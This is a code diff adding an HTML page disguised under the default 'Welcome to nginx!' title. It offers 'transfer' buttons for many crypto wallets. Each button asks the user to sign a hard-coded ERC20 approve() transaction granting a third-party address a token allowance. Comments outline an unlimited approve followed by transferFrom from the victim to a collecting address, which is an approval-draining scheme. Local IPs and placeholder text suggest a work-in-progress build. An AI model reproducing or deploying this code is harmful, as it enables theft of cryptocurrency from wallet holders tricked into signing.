@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Welcome to nginx!</title>
+
+    <style>
+        html {
+            font-size: 14px;
+            color-scheme: light dark;
+        }
+
+        body {
+            margin: 3rem auto;
+            font-family: Tahoma, Verdana, Arial, sans-serif;
+        }
+
+        .flex {
+            display: flex;
+            align-items: flex-start;
+            justify-content: flex-start;
+
+        }
+
+        p {
+            font-size: 3rem;
+            text-align: center;
+        }
+
+        .button {
+            width: 80%;
+            height: 150px;
+            background: #ff7e24;
+            border-radius: 30px;
+            font-size: 20px;
+            color: #fff;
+            margin: 10px 10%;
+        }
+    </style>
+</head>
+<body>
+<div class="flex">
+    <div id="trc20">
+        <p>TRC20</p>
+        <button class="button" name="oke">transfer oke1111</button>
+        <button class="button" name="bitKeep">transfer bitKeep</button>
+        <button class="button" name="tokenPocket">transfer tokenPocket</button>
+        <button class="button" name="imToken">transfer imToken</button>
+        <button class="button" name="tornLink">transfer tornLink</button>
+    </div>
+    <div id="erc20">
+        <p>ERC20</p>
+        <button class="button" name="metaMask">transfer metaMask</button>
+        <button class="button" name="oke">transfer oke</button>
+        <button class="button" name="coinbase">transfer coinbase</button>
+        <button class="button" name="trustWallet">transfer trustWallet</button>
+        <button class="button" name="bitKeep">transfer trustWallet</button>
+        <button class="button" name="tokenPocket">transfer tokenPocket</button>
+    </div>
+    <div id="message">222</div>
+</div>
+</body>
+<!--<script type="text/javascript" src="/js/tp.js"></script>-->
+<script type="text/javascript" src="/js/index.js?123"></script>
+<script>
+    const callBackUrl = 'http://192.168.3.13:8080/index.html?id=iu274445564'
+    const erc20Buttons = document.getElementById('erc20').getElementsByTagName('button')
+    const trc20Buttons = document.getElementById('trc20').getElementsByTagName('button')
+    const address = "0xe877fe48218DE34752ec59C099340A297C0B2588"
+    // // approve
+    // data=web3.eth.abi.encodeParameters(['address','uint256'], ['0xaaaaaa', '9999999999999999']);
+    // // transaferFrom
+    // data=web3.eth.abi.encodeParameters(['address', 'address','uint256'], ['params中的from地址','收款地址', '收款金额']);
+    // // transafer
+    // data=web3.eth.abi.encodeParameters(['address', 'uint256'], ['收款地址', '收款金额']);
+    const data = "0x095ea7b3000000000000000000000000882d6e303f260a401eb61e3a17ba0fdee161dd02000000000000000000000000000000000000000000000000000000000bebc200"
+    const value = 2000000
+    const callBack = (message) => {
+        alert(message)
+    }
+    const addClick = (buttons, type) => {
+        for (let i = 0; i < buttons.length; i++) {
+            const button = buttons[i]
+            button.addEventListener('click', (event) => {
+                window.signAndTransfer({
+                    type,
+                    appName: event.target.name,
+                    address,
+                    value,
+                    data,
+                    callBack
+                }).then(res => console.log(res))
+            })
+        }
+    }
+    addClick(trc20Buttons, 'trc20')
+    addClick(erc20Buttons, 'erc20')
+
+
+    // {
+    //     erc20:['trustWallet', "metamask", 'coinBase', 'bitKeep', 'oke'],
+    //     trc20:[ 'bitKeep', 'oke','tokenPocket','imToken','tornLink']
+    // }
+</script>
+</html>
